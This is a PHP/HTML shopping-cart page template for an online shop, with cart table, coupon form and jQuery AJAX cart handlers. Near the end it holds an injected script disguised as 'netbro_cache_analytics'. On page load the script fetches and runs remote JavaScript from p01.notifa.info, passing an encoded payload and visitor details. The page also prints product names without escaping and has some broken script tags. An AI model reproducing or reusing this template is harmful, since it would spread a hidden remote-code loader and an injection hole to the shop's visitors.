<!--Default-->

<!DOCTYPE html>
<html lang="en">
    
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>

        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
                <meta name="author" content="BDTASK">
        <meta name="description" content="">

        <title>Cart</title>
   
        <!-- Favicons --> 
        <link rel="icon" type="image/png" href="<?php echo base_url().'my-assets/image/logo/b561929d20e2e5728e05d4f0bbafe7f7.png'?>">
        
        <!-- Bootstrap core CSS -->
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
        <!-- Bootstrap core CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/bootstrap/css/bootstrap.min.css'?>" rel="stylesheet">  
        
        <!-- FontAwesome Icon CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/font-awesome/css/font-awesome.min.css'?>" rel="stylesheet" type="text/css"> 
        
        <!-- Jquery UI CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/jquery-ui/jquery-ui.min.css'?>" rel="stylesheet"> 
        
        <!-- Owl Carousel CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/owl-carousel/owl.carousel.min.css'?>" rel="stylesheet">
        
        <!-- Animate CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/wow-js/animate.css'?>" rel="stylesheet"> 
        
        <!-- Lightbox CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/lightbox/css/lightbox.min.css'?>" rel="stylesheet"> 

        <!-- Custom styles for this template -->
        <link href="<?php echo base_url().'assets/website/css/style.css'?>" rel="stylesheet"> 
        <!-- EasyZoom CSS -->
        <link rel="stylesheet" href="<?php echo base_url().'assets/website/vendor/easyzoom/easyzoom.min.css'?>">

        <!-- Responsive Style -->
        <link href="<?php echo base_url().'assets/website/css/responsive.css'?>" rel="stylesheet">

        <!-- Include SmartWizard CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/SmartWizard-master/dist/css/smart_wizard.css'?>" rel="stylesheet" type="text/css">

        <!-- Optional SmartWizard theme -->
        <link href="<?php echo base_url().'assets/website/vendor/SmartWizard-master/dist/css/smart_wizard_theme_dots.css'?>" rel="stylesheet" type="text/css">

        <!-- Jquery  -->
        <script src="<?php echo base_url().'assets/website/vendor/jquery/jquery-3.2.1.min.js'?>" type="text/javascript"></script>

        <!-- jquery-ui.min.js -->
        <script src="<?php echo base_url().'assets/website/vendor/jquery-ui/jquery-ui.min.js'?>" type="text/javascript"></script>
        
        <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
        <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
        <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
        <![endif]-->


        <style type="text/css">
            .slider_area .slider_inner.home2_slider{
                margin-left: 0px; 
            }
            
            .slider_style .owl-nav{
                top:60px;
               
            }
            .discount{
                background-color:#20C507;
                padding: 10px;
                    
                
            }
            .shadow {
               -moz-box-shadow:    inset 0 0 10px #000000;
               -webkit-box-shadow: inset 0 0 10px #000000;
               box-shadow:         inset 0 0 10px #000000;
            }
            .pading-diskon{
                background: #20C50E;
                padding-left:41px;
                padding-right:41px;
            }
            .slider_style .owl-nav .owl-prev {
    border-radius: 50px;
    left: 22rem;
    display: inline-block;
    width: 30px;
    height: 30px;
    line-height: 30px;
    border: 1px solid #000;
    margin: 0px 1095px;
    transition: all 300ms linear 0s;
    margin-left: -50px;
            }
            
            .slider_style .owl-nav {
    text-align: center;
    top: 91px;
    position: absolute;
    right: -37px;
                
            }
            .btn-kanan{
                float: right;
                height: 50px;
            }
            .btn-kanan:hover{
                color:white;
                background: black;
            }
            th{
                background: #928d8d;
                color: white;
                text-align: center;
            }
            
            .bg_red{
              color: white;
              background: red;
            }
            .bg_blue{
              color: white;
              background: blue;
            }
            .bg_yellow{
              color: white;
              background: yellow;
            }
            .bg_green{
              color: white;
              background: green;
            }
            .center{
                    text-align: center;
            }
            
            td{
                padding: 35px;
               border-bottom: 2px #b7b7b7 solid;
            }
            .radius{
                border-radius: 50px;
            }
            
            .table td, .table th{
                vertical-align: middle;
            }
            
            .max200{
                
                max-height:200px; 
                
            }
            .table .thead-dark th{
               color: #fff;
                background-color: #22df00;
                border-color: #22df00; 
                
            }
            
            
            
            
        </style>

     
    
    </head>

    <body>
        <!--==== Preloader =======-->
        <div class="preloader"></div>

        <!--========== Header Top Area ==========-->
       <?php      $this->load->view('header_top');             ?> 
        <!--========== End Header Top Area ==========-->
        
        <!--====== Header Area ======-->
<header>
    <!-- Main Header Area -->
   <?php      $this->load->view('header_main');             ?> 
    

   
</header>
<!--===== End Header Area =======-->

    <style type="text/css">
        input.loading {
            background: #fff url(assets/website/image/resize.gif) no-repeat center !important;
        }
    </style>

    <script data-cfasync="false" src="cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript">
        
        //Product search by product name
        $('body').on('keyup', '#product_name', function() {

            var product_name = $('#product_name').val();
            var category_id  = $('#select_category').val();

            //Product name check
            if (product_name == 0) {
                $('.search_results').html(' ');
                return false;
            }
            
            $.ajax({
                type: "post",
                async: false,
                url: 'http://isshue.bdtask.com/isshue-v1.5/website/Category/category_product_search_ajax',
                data: {product_name: product_name,category_id:category_id},
                beforeSend: function(){
                    $('#product_name').addClass('loading');
                },
                success: function(data) {
                    $('#product_name').removeClass('loading');
                    if (data) {
                        $('.search_results').html(data);
                    }
                },
                error: function() {
                    alert('Request Failed, Please check your code and try again!');
                }
            });
        });
    </script>

<!-- Product delete from cart by ajax -->
<script type="text/javascript">
    $('body').on('click', '.delete_cart_item', function() {
        var row_id  = $(this).attr('name');
        $.ajax({
            type: "post",
            async: true,
            url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/delete_cart/',
            data: {row_id:row_id},
            success: function(data) {
                $("#tab_up_cart").load(location.href+" #tab_up_cart>*","");
            },
            error: function() {
                alert('Request Failed, Please check your code and try again!');
            }
        });
    });  
</script>           


<!-- Content  -->
       
     <center><h1 class="m-5" style="font-size: 4.05rem;">MY CART</h1></center>
        
   <form action="http://isshue.bdtask.com/isshue-v1.5/home/update_cart" method="post" accept-charset="utf-8">
<!--==========Shopping cart area==========-->
<div class="shopping_cart_area">
    <div class="container">
        <div class="shopping_cart_inner">
            <div class="table-responsive"> 
                <table class="table table-striped"> 
                    <thead class="thead-dark"> 
                        <tr> 
                            <th>Image</th> 
                            <th>Product Name</th>                             
                            <th>Qnty</th> 
                            <th>Price</th> 
                            <th>Total</th> 
                            <th>Delete</th> 
                        </tr> 
                    </thead> 
                    <tbody> 

                                                                        
<input type="hidden" name="1[rowid]" value="0f7b7f5f8cf0ded4442e3d2e91c79b0b">
 <?php foreach ($cart as $items) { ?>
                        <tr>
                            <td><img src="<?php echo base_url()?>my-assets/image/product/<?php echo $items['gbr']; ?>" alt=""></td>
                            <td><?php echo $items['name']; ?></td>
                           
                            
                            <td class="qty-cart">
                            
                                <input type="text" name="1[qty]" value="<?php echo $items['qty']; ?>" class="text-center " maxlength="3" size="5">
                                <button type="submit" class="update_cart" data-id="<?php echo $items['rowid']?>" data-qty="<?php echo $items['qty']?>"><i class="fa fa-refresh" style="font-size:20px;padding: 0px;"></i></button>
                            </td>
                            
                            <td>Rp. <?php echo number_format($items['price']); ?> </td>
                            <td>Rp. <?php echo number_format($items['price']*$items['qty']); ?></td>
                            
                            <td>
                                <a href="<?php echo base_url()?>customer/cart"  id="<?php echo $items['rowid']?>" class="hapus_cart" name="7a10563a10f7c44814661c2a1d28fb4f">
                            <i class="fa fa-trash"></i>
                        </a>
                            </td>
                        </tr>
<?php } ?> 
             

                                                                       
                    </tbody> 
                </table> 
            </div>
        </div>
    </div>
</div>
<!--==========End Shopping cart area==========-->
</form>
        <!--coupon-->
        <section class="coupon_area">
    <div class="container">
        <div class="row db coupon_inner">
            <h5>Use coupon code</h5>
            
                <div class="enter_coupon">
                    <label>Enter your coupon here:</label><input type="hidden" name="grandtotal" id="gt" value="<?php echo $total; ?>">
                    <input type="text" name="coupon_code" placeholder="Enter your coupon here" required="">
                    <button type="submit" id="tombol">Apply Coupon</button>
                </div>
        
        </div>
    </div>
</section>
        
        
        <!--price-->
<section class="coupon_area">
    <div class="container">
        <div class="row db coupon_inner">
            <h5>GRAND TOTAL :<b id="grandtotal"> <?php echo 'Rp.'.$total; ?> </b></h5>
            <div class="checkout-box" style="margin-top: 5px; margin-right:25px;">
                <a href="<?php echo base_url().'customer/checkout'?>"><button class="btn btn-primary">Checkout</button></a>
            </div>
        </div>
    </div>
</section>
        <!--./coupon-->
    <!--    price
<div class="price_area">
    <div class="container">
        <div class="row db m0 price_inner">
            <table class="pricing_list">
                <tbody>
                    <tr>
                        <td class="price_title">
                            Sub Total                        </td>
                        <td class="price_Currency">
                            $2,370.00                        </td>
                    </tr>
                                        <tr>
                        <td class="price_title">
                            Grand Total                        </td>

                        <td class="price_Currency">
                            <h1>       </h1>              </td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>
</div>        
        -->
        
<!--=========== footer Area ===========-->
 
 <?php      $this->load->view('footer');         

        function rupiah($angka){
    
            echo "Rp " . number_format($angka,2,',','.');
                // return $hasil_rupiah;
         
        } 

  
        function limit_words($string, $word_limit){
            $words = explode(" ",$string);
            return implode(" ",array_splice($words,0,$word_limit));
        }
   ?>  
        
<!--=========== ./footer Area ===========-->




        <!-- Bootstrap  -->
        <script data-cfasync="false" src="cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="<?php echo base_url().'assets/website/vendor/bootstrap/js/tether.min.js'?>" type="text/javascript"></script>
        <script src="<?php echo base_url().'assets/website/vendor/bootstrap/js/bootstrap.min.js'?>" type="text/javascript"></script>

        <script type="text/javascript" src="cdnjs.cloudflare.com/ajax/libs/1000hz-bootstrap-validator/0.11.5/validator.min.js'?>"></script>

        <!-- Include SmartWizard JavaScript source -->
        <script type="text/javascript" src="<?php echo base_url().'assets/website/vendor/SmartWizard-master/dist/js/jquery.smartWizard.min.js'?>"></script>

        <!-- Owl Carousel -->
        <script src="<?php echo base_url().'assets/website/vendor/owl-carousel/owl.carousel.min.js'?>" type="text/javascript"></script>

        <!-- EasyZoom -->
        <script src="<?php echo base_url().'assets/website/vendor/easyzoom/easyzoom.min.js'?>" type="text/javascript"></script>

        <!-- DSCount JS -->
        <script src="<?php echo base_url().'assets/website/vendor/dscountdown/dscountdown.min.js'?>" type="text/javascript"></script>
        
        <!-- WoW js -->
        <script src="<?php echo base_url().'assets/website/vendor/wow-js/wow.min.js'?>"></script>
        
        <!-- Lightbox js -->
        <script src="<?php echo base_url().'assets/website/vendor/lightbox/js/lightbox.min.js'?>"></script>  

        <!-- Simple Share js -->
        <script src="<?php echo base_url().'assets/website/js/jquery.simpleSocialShare.min.js'?>"></script>

        <!-- Custom scripts for this template -->
        <script src="<?php echo base_url().'assets/website/js/theme.js'?>"></script>

        <script type="text/javascript">

            //Simple share
            $('.share-button').simpleSocialShare();
            
            //Change language ajax
            $('body').on('change', '#change_language', function() {
                var language  = $('#change_language').val();
                $.ajax({
                    type: "post",
                    async: true,
                    url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/change_language',
                    data: {language:language},
                    success: function(data) {
                        if (data == 2) {
                            location.reload();
                        }else{
                            location.reload();
                        }
                    },
                    error: function() {
                        alert('Request Failed, Please check your code and try again!');
                    }
                });
            }); 

            //Change currency ajax
            $('body').on('change', '#change_currency', function() {
                var currency_id  = $('#change_currency').val();
                $.ajax({
                    type: "post",
                    async: true,
                    url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/change_currency',
                    data: {currency_id:currency_id},
                    success: function(data) {
                        if (data == 2) {
                            location.reload();
                        }else{
                            location.reload();
                        }
                    },
                    error: function() {
                        alert('Request Failed, Please check your code and try again!');
                    }
                });
            }); 

            //Add to cart by ajax
            function add_to_cart(id){
                var product_id = $('#product_id_'+id).val();
                var price      = $('#price_'+id).val();
                var discount   = $('#discount_'+id).val();
                var qnty       = $('#qnty_'+id).val();
                var image      = $('#image_'+id).val();
                var name       = $('#name_'+id).val();
                var model      = $('#model_'+id).val();
                var supplier_price      = $('#supplier_price_'+id).val();
                var cgst      = $('#cgst_'+id).val();
                var cgst_id   = $('#cgst_id_'+id).val();
                var sgst      = $('#sgst_'+id).val();
                var sgst_id   = $('#sgst_id_'+id).val();
                var igst      = $('#igst_'+id).val();
                var igst_id   = $('#igst_id_'+id).val();

                if (product_id == 0) {
                    alert('Ooops something went wrong.');
                    return false;
                }
                $.ajax({
                    type: "post",
                    async: true,
                    url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/add_to_cart',
                    data: {
                        product_id:product_id,
                        price:price,
                        discount:discount,
                        qnty:qnty,
                        image:image,
                        name:name,
                        model:model,
                        supplier_price:supplier_price,
                        cgst:cgst,
                        cgst_id:cgst_id,
                        sgst:sgst,
                        sgst_id:sgst_id,
                        igst:igst,
                        igst_id:igst_id,
                    },
                    beforeSend: function(){
                        $('.preloader').html("<img src='assets/website/image/loader.gif'>");
                    },
                    success: function(data) {
                        $("#tab_up_cart").load(location.href+" #tab_up_cart>*","");
                    },
                    error: function() {
                        alert('Request Failed, Please check your code and try again!');
                    }
                });
            }

            //Add to cart by ajax
            function cart_btn(product_id){
                var qnty       = $('#sst').val();
                var variant    = $('#select_size1').val();

                if (product_id == 0) {
                    alert('Ooops something went wrong.');
                    return false;
                }
                if (qnty <= 0) {
                    alert('Please keep quantity up to zero !');
                    return false;
                }
                if (variant != 'undefine') {
                    if (variant <= 0) {
                        alert('Please select product size !');
                        return false;
                    }
                }
                
                $.ajax({
                    type: "post",
                    async: true,
                    url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/add_to_cart_details',
                    data: {product_id:product_id,qnty:qnty,variant:variant},
                    success: function(data) {
                        $("#tab_up_cart").load(location.href+" #tab_up_cart>*","");
                    },
                    error: function() {
                        alert('Request Failed, Please check your code and try again!');
                    }
                });
            }
        </script>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mN8SBaYYlsFeUcDpnfQuaKJY%2f%2b4ifx7FXqVglW98PVFQvyY7T5Gk6N3jNgEJBhG6GaIzUqsjF%2f4TLSGOEsYplytwPHPHZFO3%2bR6hyaZOWCDQ8NlS%2b7NVfrYlTPyMtYeFvjQ%2fnLSStYmmFKlaYd%2bcyO0NvOwT%2b9o5NpgZK1gmIGgBQxkfGD%2fb9NYJ5IJVImWu%2fqDBvW%2b9q2qM5N6XydmS8ZLD0HEqy8N%2bx3cr7%2f6jh278SYgwY8uZjHU0e6QkQ1T2jY6I1JON1wBuBdTZDw5sy6dgh7d5LWLX4DVb3zDZPQPk6JEqAaM6yvxHaRlLpKWD5Qpu81O%2bLfziK99WRxo5OJNny1p1UL6OtYYO1GSuVvqfajzEcbbhCo5JXOLkOoUYa84r0WrbrcFiNk5r3M5YfMpXZfbTpbsQhGlXzCd9KuM9lq%2brlrbLdjgDkYGjAsQcXf5g4enwoja3mCiFUt1yIbw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
    
    
      <!-- Update -->
      <script type="text/javascript">
           //Hapus Item Cart
                $(document).on('click','.update_cart',function(){
                    var row_id=$(this).data("id"); //mengambil row_id dari artibut id
                    var qty=$(this).parent('.qty-cart').find("input").val(); //mengambil qty
                    // alert(qty);
                    $.ajax({
                        url : "<?php echo base_url();?>home/update_cart",
                        method : "POST",
                        data : {row_id : row_id,qty : qty},
                        success :function(){
                             location.reload();

                            // $('#detail_cart').html(data);
                            // $('#detail_cart').load("<?php echo base_url();?>home/load_cart");
                            // $('#count_cart').laod("<?php echo base_url();?>home/load_count");
                            // $('#count_cart_top').load("<?php echo base_url();?>home/load_count_top");

                        }
                    });
                });
      </script>
        

        
        <script>
            $('.discount').owlCarousel({
                margin:10,
                loop:true,
                autoWidth:true,
                items:4,
                 nav: true  ,
             navText : ["<",">"],})
        </script>
        
        
    </body>


</html>
